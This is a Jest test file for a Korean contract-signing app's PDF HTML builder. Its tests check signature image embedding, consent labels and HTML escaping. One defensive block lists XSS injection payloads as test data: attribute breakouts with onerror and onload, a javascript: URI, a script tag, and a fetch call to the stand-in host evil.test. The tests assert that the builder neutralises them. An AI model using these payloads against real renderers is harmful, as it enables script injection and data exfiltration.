/** @jest-environment node */

import type { Contract, ContractAttachment, ContractClause, Signature } from '../../db/schema';
import { buildContractPdfHtml } from './pdf-html';

const now = new Date('2026-07-27T05:00:00.000Z');

const VALID_SIGNATURE =
  'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==';

const contract = (overrides: Partial<Contract> = {}): Contract =>
  ({
    id: 'contract-1',
    title: '테스트 계약',
    description: null,
    customerName: '홍길동',
    customerBirthdate: null,
    customerEmail: 'test@example.com',
    customerPhone: '010-1234-5678',
    customerAddress: null,
    roomNumber: 'A',
    roomArea: '3m × 2m',
    startDate: now,
    endDate: now,
    monthlyRent: 300000,
    depositAmount: 300000,
    paymentDay: 1,
    paymentBank: '카카오뱅크',
    paymentAccount: '3333-12-5480849',
    paymentAccountHolder: '황경하 / 스튜디오 놀',
    content: '# 계약 본문',
    status: 'signed',
    rulesAgreed: true,
    rulesAgreedAt: now,
    specialTerms: null,
    sentAt: now,
    signedAt: now,
    expiresAt: null,
    signToken: 'token',
    signTokenUsedAt: now,
    pdfUrl: null,
    pdfGeneratedAt: null,
    createdAt: now,
    updatedAt: now,
    ...overrides,
  }) as Contract;

const signature = (overrides: Partial<Signature> = {}): Signature =>
  ({
    id: 'sig-1',
    contractId: 'contract-1',
    signerName: '홍길동',
    signerEmail: 'test@example.com',
    signerRole: 'customer',
    status: 'signed',
    signedAt: now,
    ipAddress: '203.0.113.7',
    userAgent: 'test',
    signatureData: VALID_SIGNATURE,
    createdAt: now,
    updatedAt: now,
    ...overrides,
  }) as Signature;

const clauses: ContractClause[] = [
  {
    id: 'c1',
    contractId: 'contract-1',
    clauseNumber: '제5조',
    title: '보증금 및 그 납부 면제',
    agreedAt: now,
    createdAt: now,
  },
];

const attachments: ContractAttachment[] = [
  {
    id: 'a1',
    contractId: 'contract-1',
    type: 'rules',
    title: '공동생활 이용수칙',
    agreedAt: null,
    createdAt: now,
  },
];

const build = (overrides: Partial<Parameters<typeof buildContractPdfHtml>[0]> = {}) =>
  buildContractPdfHtml({
    contract: contract(),
    signature: signature(),
    clauses,
    attachments,
    rulesContent: '',
    ...overrides,
  });

describe('계약서 PDF HTML', () => {
  it('정상적인 서명 이미지를 그대로 넣는다', () => {
    const html = build();
    expect(html).toContain(`src="${VALID_SIGNATURE}"`);
  });

  it('동의 항목은 실제 동의 시각 유무로 표시한다', () => {
    const html = build();
    expect(html).toContain('✓ 동의');
    expect(html).toContain('미동의');
  });

  it('운영자 날인 CSS를 넣으면 문서에 포함된다', () => {
    expect(build({ sealCss: '.seal { color: red; }' })).toContain('.seal { color: red; }');
  });
});

describe('서명 이미지 삽입 방어 (PDF는 Chromium이 실제로 렌더링한다)', () => {
  /**
   * 저장 시점 검증을 통과하지 못하는 값이 어떤 경로로든 DB에 남았을 때,
   * PDF 템플릿이 그것을 그대로 HTML 속성에 넣으면 태그·이벤트 핸들러가 주입된다.
   */
  const attacks = [
    '" onerror="alert(1)',
    'data:image/png;base64,AAA" onload="fetch(`http://evil.test`)',
    'javascript:alert(1)',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    '"><script>alert(1)</script>',
  ];

  it.each(attacks)('주입 시도를 이미지로 렌더링하지 않는다: %s', (payload) => {
    const html = build({ signature: signature({ signatureData: payload }) });

    expect(html).not.toContain('onerror=');
    expect(html).not.toContain('onload=');
    expect(html).not.toContain('<script>');
    expect(html).toContain('서명 이미지를 표시할 수 없습니다');
  });

  it('서명 데이터가 비어 있어도 서명자 정보는 남긴다', () => {
    const html = build({ signature: signature({ signatureData: null }) });

    expect(html).toContain('서명 이미지가 없습니다');
    expect(html).toContain('203.0.113.7');
  });

  it('서명 기록 자체가 없으면 그 사실을 표시한다', () => {
    expect(build({ signature: null })).toContain('서명 기록이 없습니다');
  });

  it('서명자 이름·IP의 HTML도 이스케이프한다', () => {
    const html = build({
      signature: signature({ signerName: '<script>alert(1)</script>' }),
    });

    expect(html).not.toContain('<script>alert(1)</script>');
    expect(html).toContain('&lt;script&gt;');
  });
});
